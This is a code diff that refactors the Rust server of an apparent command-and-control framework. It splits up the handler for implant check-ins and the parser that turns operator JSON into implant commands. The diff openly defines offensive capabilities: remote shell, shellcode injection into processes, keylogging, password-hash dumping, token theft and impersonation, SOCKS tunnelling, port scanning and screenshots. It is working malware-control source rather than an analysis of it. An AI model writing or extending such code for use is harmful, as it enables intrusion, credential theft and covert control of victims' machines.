@@ -1903,17 +1903,42 @@ fn handle_existing_session(
     plaintext: Vec<u8>,
 ) -> anyhow::Result<Vec<u8>> {
     // Subsequent messages carry task responses; we reply with queued tasks.
-    //
-    // AUTHORITATIVE anti-replay check — INSIDE the write guard. The advisory
-    // read-guard check above only saves a decrypt on an obvious stale frame;
-    // THIS is where replay protection is actually enforced, because the
-    // `counter <= last_recv` test and the `last_recv = counter` commit run
-    // under one `get_mut` guard and so cannot be split by a concurrent beacon
-    // for the same session. A racing replay that also passed the advisory
-    // check loses here: whichever request takes the write guard first
-    // advances `last_recv`; the other then sees `counter <= last_recv` and is
-    // rejected. (If the session vanished between the get() above and here,
-    // return a clean error — never panic.)
+    let mut s = handle_existing_session_open(st, raw, &key)?;
+    let persist_touch = handle_existing_session_touch(st, &mut s, raw);
+    let responses = TaskResponse::decode_vec(&plaintext)?;
+    let fired = handle_existing_session_buffer_results(&mut s, raw, responses);
+    let (batch, counter) = handle_existing_session_pack_tasks(&mut s);
+    // Contract 4: persist the send/recv counters after this frame (fire-and-
+    // forget, off the hot path, like the touch) so both counter spaces survive
+    // a restart. `last_recv` was already advanced to `raw.counter` above.
+    let persist_counters = st.sessions_db.as_ref().map(|persist| {
+        (
+            persist.clone(),
+            hex::encode(raw.pubkey),
+            counter,
+            raw.counter,
+        )
+    });
+    drop(s);
+    handle_existing_session_fire_after_lock(st, persist_touch, persist_counters, fired);
+    handle_existing_session_encode_reply(st, raw, key, batch, counter)
+}
+
+/// Acquire the session under the write guard and run the AUTHORITATIVE
+/// anti-replay check — INSIDE the write guard. The advisory read-guard check
+/// above only saves a decrypt on an obvious stale frame; THIS is where replay
+/// protection is actually enforced, because the `counter <= last_recv` test
+/// and the `last_recv = counter` commit run under one `get_mut` guard and so
+/// cannot be split by a concurrent beacon for the same session. A racing
+/// replay that also passed the advisory check loses here: whichever request
+/// takes the write guard first advances `last_recv`; the other then sees
+/// `counter <= last_recv` and is rejected. (If the session vanished between
+/// the get() above and here, return a clean error — never panic.)
+fn handle_existing_session_open<'a>(
+    st: &'a AppState,
+    raw: &nyx_protocol::RawFrame,
+    key: &SessionKey,
+) -> anyhow::Result<dashmap::mapref::one::RefMut<'a, SessionId, Session>> {
     let mut s = st
         .sessions
         .get_mut(&raw.pubkey)
@@ -1934,12 +1959,20 @@ fn handle_existing_session(
     if was_stale {
         s.key = key.clone();
     }
-    // Throttle the cheap last_seen-only persistence write to at most one
-    // per session per PERSIST_TOUCH_THROTTLE. Decided under the write guard
-    // so two concurrent beacons for the same session can't both fire a
-    // touch; the actual SQLite write runs AFTER the guard is dropped, off
-    // the hot path on the persistence background thread.
-    let persist_touch = if let Some(persist) = &st.sessions_db {
+    Ok(s)
+}
+
+/// Decide the throttled last_seen-only persistence write: at most one per
+/// session per PERSIST_TOUCH_THROTTLE. Decided under the write guard so two
+/// concurrent beacons for the same session can't both fire a touch; the actual
+/// SQLite write runs AFTER the guard is dropped, off the hot path on the
+/// persistence background thread.
+fn handle_existing_session_touch(
+    st: &AppState,
+    s: &mut dashmap::mapref::one::RefMut<'_, SessionId, Session>,
+    raw: &nyx_protocol::RawFrame,
+) -> Option<(Arc<SessionPersistence>, String, u64)> {
+    if let Some(persist) = &st.sessions_db {
         let now = Instant::now();
         if now.duration_since(s.persisted_last_touch) >= PERSIST_TOUCH_THROTTLE {
             s.persisted_last_touch = now;
@@ -1949,12 +1982,21 @@ fn handle_existing_session(
         }
     } else {
         None
-    };
-    let responses = TaskResponse::decode_vec(&plaintext)?;
-    // Snapshot the scripting-event payloads now (we're about to move
-    // `responses` into s.results), then fire them AFTER dropping the guard
-    // so a slow operator script (NYX_SCRIPT) can't block this session's
-    // DashMap shard.
+    }
+}
+
+/// Snapshot the scripting-event payloads now (we're about to move `responses`
+/// into s.results), then return them so they can be fired AFTER dropping the
+/// guard — a slow operator script (NYX_SCRIPT) must not block this session's
+/// DashMap shard. Bounds the results buffer: a rogue/compromised implant
+/// streaming Output/FileChunk blobs could otherwise fill RAM forever — evict
+/// oldest (results are best-effort; operators drain them, and an unattended
+/// server mustn't OOM on a chatty beacon).
+fn handle_existing_session_buffer_results(
+    s: &mut dashmap::mapref::one::RefMut<'_, SessionId, Session>,
+    raw: &nyx_protocol::RawFrame,
+    responses: Vec<TaskResponse>,
+) -> Vec<nyx_scripting::Event> {
     let session_id = hex::encode(raw.pubkey);
     let fired: Vec<nyx_scripting::Event> = responses
         .iter()
@@ -1979,19 +2021,25 @@ fn handle_existing_session(
             s.results.drain(0..drop_n);
         }
     }
-    // Contract 2: pack pending tasks greedily into a batch whose sealed frame
-    // fits under the protocol's MAX_CT_LEN (512 KiB ciphertext). Ciphertext
-    // length is exactly plaintext + TAG_LEN, so a batch's plaintext budget is
-    // MAX_CT_LEN - TAG_LEN. Tasks that don't fit — an unencodable task (a
-    // WireError, e.g. a blob over the wire cap) or one that alone would exceed
-    // the frame cap — stay QUEUED: NEVER dequeue a task whose frame wasn't
-    // confirmed encodable. FIFO order is preserved: the batch takes the oldest
-    // tasks and deferred ones keep their relative order.
-    //
-    // The task-count guard mirrors `Task::encode_vec`'s silent truncation at
-    // MAX_WIRE_COUNT (256, protocol-internal): without it, a batch over 256
-    // tasks would have the tail silently dropped from the reply while the
-    // tasks were already dequeued.
+    fired
+}
+
+/// Contract 2: pack pending tasks greedily into a batch whose sealed frame
+/// fits under the protocol's MAX_CT_LEN (512 KiB ciphertext). Ciphertext
+/// length is exactly plaintext + TAG_LEN, so a batch's plaintext budget is
+/// MAX_CT_LEN - TAG_LEN. Tasks that don't fit — an unencodable task (a
+/// WireError, e.g. a blob over the wire cap) or one that alone would exceed
+/// the frame cap — stay QUEUED: NEVER dequeue a task whose frame wasn't
+/// confirmed encodable. FIFO order is preserved: the batch takes the oldest
+/// tasks and deferred ones keep their relative order.
+///
+/// The task-count guard mirrors `Task::encode_vec`'s silent truncation at
+/// MAX_WIRE_COUNT (256, protocol-internal): without it, a batch over 256
+/// tasks would have the tail silently dropped from the reply while the
+/// tasks were already dequeued.
+fn handle_existing_session_pack_tasks(
+    s: &mut dashmap::mapref::one::RefMut<'_, SessionId, Session>,
+) -> (Vec<Task>, u64) {
     let mut batch: Vec<Task> = Vec::new();
     let mut batch_plain: usize = 4; // u32 count prefix
     let mut deferred: Vec<Task> = Vec::new();
@@ -2018,21 +2066,19 @@ fn handle_existing_session(
     s.pending = deferred;
     s.send_counter += 1;
     let counter = s.send_counter;
-    // Contract 4: persist the send/recv counters after this frame (fire-and-
-    // forget, off the hot path, like the touch) so both counter spaces survive
-    // a restart. `last_recv` was already advanced to `raw.counter` above.
-    let persist_counters = st.sessions_db.as_ref().map(|persist| {
-        (
-            persist.clone(),
-            hex::encode(raw.pubkey),
-            counter,
-            raw.counter,
-        )
-    });
-    drop(s);
-    // Fire the throttled last_seen persistence write now that the shard
-    // lock is released. Best-effort, non-blocking: if the background thread
-    // has exited this is a no-op.
+    (batch, counter)
+}
+
+/// Fire the throttled last_seen persistence write, the counter persistence,
+/// and the queued scripting events now that the shard lock is released. All
+/// best-effort, non-blocking: if the background thread has exited these are
+/// no-ops.
+fn handle_existing_session_fire_after_lock(
+    st: &AppState,
+    persist_touch: Option<(Arc<SessionPersistence>, String, u64)>,
+    persist_counters: Option<(Arc<SessionPersistence>, String, u64, u64)>,
+    fired: Vec<nyx_scripting::Event>,
+) {
     if let Some((persist, id, ts)) = persist_touch {
         persist.touch(id, ts);
     }
@@ -2042,6 +2088,20 @@ fn handle_existing_session(
     for ev in fired {
         st.events.fire(&ev);
     }
+}
+
+/// Encode the queued-task batch and seal it as the S2C reply. On an encode or
+/// seal failure the batch was already dequeued — put it back so its tasks
+/// aren't lost (the check-in fails and the implant retries with a fresh
+/// counter). Best-effort: if the session was evicted meanwhile, the tasks are
+/// dropped with it.
+fn handle_existing_session_encode_reply(
+    st: &AppState,
+    raw: &nyx_protocol::RawFrame,
+    key: SessionKey,
+    batch: Vec<Task>,
+    counter: u64,
+) -> anyhow::Result<Vec<u8>> {
     let reply = match Task::encode_vec(&batch) {
         Ok(reply) => reply,
         Err(e) => {
@@ -2389,61 +2449,13 @@ impl JsonCommand {
         Ok(match self {
             JsonCommand::Ping => Command::Ping,
             JsonCommand::Shell { args } => Command::Shell { args },
-            JsonCommand::Sleep {
-                seconds,
-                jitter_pct,
-            } => Command::Sleep {
-                seconds,
-                jitter_pct,
-            },
-            JsonCommand::Upload { name, data_hex } => {
-                let data = hex::decode(&data_hex).map_err(|_| "bad data_hex")?;
-                Command::Upload { name, data }
-            }
+            JsonCommand::Sleep { seconds, jitter_pct } => Command::Sleep { seconds, jitter_pct },
+            JsonCommand::Upload { name, data_hex } => into_command_upload(name, data_hex)?,
             JsonCommand::Download { path } => Command::Download { path },
-            JsonCommand::Bof {
-                name,
-                args,
-                data_hex,
-            } => {
-                let blob = hex::decode(&data_hex).map_err(|_| "bad data_hex")?;
-                Command::Bof { name, args, blob }
-            }
-            JsonCommand::FileOp { op, path, dest } => {
-                let fileop = match op.as_str() {
-                    "cd" => FileOp::Cd,
-                    "mkdir" => FileOp::Mkdir,
-                    "rm" => FileOp::Rm,
-                    "mv" => FileOp::Mv,
-                    "cp" => FileOp::Cp,
-                    "ls" => FileOp::Ls,
-                    _ => return Err("bad file op"),
-                };
-                Command::FileOp {
-                    op: fileop,
-                    path,
-                    dest,
-                }
-            }
-            JsonCommand::Connect { host, port } => {
-                Command::Connect {
-                    proto: 0, // TCP
-                    host,
-                    port,
-                    chan: next_chan(),
-                }
-            }
-            JsonCommand::Socks {
-                chan,
-                op,
-                addr,
-                port,
-            } => Command::Socks {
-                chan,
-                op,
-                addr,
-                port,
-            },
+            JsonCommand::Bof { name, args, data_hex } => into_command_bof(name, args, data_hex)?,
+            JsonCommand::FileOp { op, path, dest } => into_command_fileop(op, path, dest)?,
+            JsonCommand::Connect { host, port } => into_command_connect(host, port),
+            JsonCommand::Socks { chan, op, addr, port } => Command::Socks { chan, op, addr, port },
             JsonCommand::Screenshot { monitor } => Command::Screenshot { monitor },
             JsonCommand::Portscan { host, ports } => Command::Portscan { host, ports },
             JsonCommand::Net { query } => Command::Net { query },
@@ -2453,10 +2465,7 @@ impl JsonCommand {
             JsonCommand::Keylog { action } => Command::Keylog { action },
             JsonCommand::Screenwatch { interval_secs } => Command::Screenwatch { interval_secs },
             JsonCommand::Hashdump { method } => Command::Hashdump { method },
-            JsonCommand::ChannelData { chan, data_hex } => {
-                let data = hex::decode(&data_hex).map_err(|_| "bad data_hex")?;
-                Command::ChannelData { chan, data }
-            }
+            JsonCommand::ChannelData { chan, data_hex } => into_command_channel_data(chan, data_hex)?,
             JsonCommand::ChannelClose { chan } => Command::ChannelClose { chan },
             JsonCommand::StealToken { pid } => Command::StealToken { pid },
             JsonCommand::MakeToken {
@@ -2472,25 +2481,88 @@ impl JsonCommand {
             },
             JsonCommand::Rev2Self => Command::Rev2Self,
             JsonCommand::GetUid => Command::GetUid,
-            JsonCommand::Inject {
-                method,
-                pid,
-                spawn_to,
-                sc_hex,
-            } => {
-                let shellcode = hex::decode(&sc_hex).map_err(|_| "invalid hex in sc_hex")?;
-                Command::Inject {
-                    method,
-                    pid,
-                    spawn_to,
-                    shellcode,
-                }
+            JsonCommand::Inject { method, pid, spawn_to, sc_hex } => {
+                into_command_inject(method, pid, spawn_to, sc_hex)?
             }
             JsonCommand::Trex => Command::Trex,
             JsonCommand::SetChannel { channel } => Command::SetChannel { channel },
             JsonCommand::Exit => Command::Exit,
         })
     }
+}
+
+/// `Upload` decodes its hex payload here; a malformed hex string is surfaced
+/// as an error for a 400 response.
+fn into_command_upload(name: String, data_hex: String) -> Result<Command, &'static str> {
+    let data = hex::decode(&data_hex).map_err(|_| "bad data_hex")?;
+    Ok(Command::Upload { name, data })
+}
+
+/// `Bof` decodes its hex COFF payload here; a malformed hex string is surfaced
+/// as an error for a 400 response.
+fn into_command_bof(
+    name: String,
+    args: Vec<String>,
+    data_hex: String,
+) -> Result<Command, &'static str> {
+    let blob = hex::decode(&data_hex).map_err(|_| "bad data_hex")?;
+    Ok(Command::Bof { name, args, blob })
+}
+
+/// File-system op family: map the string op to the wire [`FileOp`].
+fn into_command_fileop(
+    op: String,
+    path: String,
+    dest: Option<String>,
+) -> Result<Command, &'static str> {
+    let fileop = match op.as_str() {
+        "cd" => FileOp::Cd,
+        "mkdir" => FileOp::Mkdir,
+        "rm" => FileOp::Rm,
+        "mv" => FileOp::Mv,
+        "cp" => FileOp::Cp,
+        "ls" => FileOp::Ls,
+        _ => return Err("bad file op"),
+    };
+    Ok(Command::FileOp {
+        op: fileop,
+        path,
+        dest,
+    })
+}
+
+/// Open an outbound connection (P2P / rportfwd); chan 由 server 分配.
+fn into_command_connect(host: String, port: u16) -> Command {
+    Command::Connect {
+        proto: 0, // TCP
+        host,
+        port,
+        chan: next_chan(),
+    }
+}
+
+/// `ChannelData` decodes its hex payload here; a malformed hex string is
+/// surfaced as an error for a 400 response.
+fn into_command_channel_data(chan: u32, data_hex: String) -> Result<Command, &'static str> {
+    let data = hex::decode(&data_hex).map_err(|_| "bad data_hex")?;
+    Ok(Command::ChannelData { chan, data })
+}
+
+/// `Inject` decodes its hex shellcode payload here; a malformed hex string is
+/// surfaced as an error for a 400 response.
+fn into_command_inject(
+    method: u8,
+    pid: u32,
+    spawn_to: String,
+    sc_hex: String,
+) -> Result<Command, &'static str> {
+    let shellcode = hex::decode(&sc_hex).map_err(|_| "invalid hex in sc_hex")?;
+    Ok(Command::Inject {
+        method,
+        pid,
+        spawn_to,
+        shellcode,
+    })
 }
 
 fn parse_session_hex(s: &str) -> Option<SessionId> {
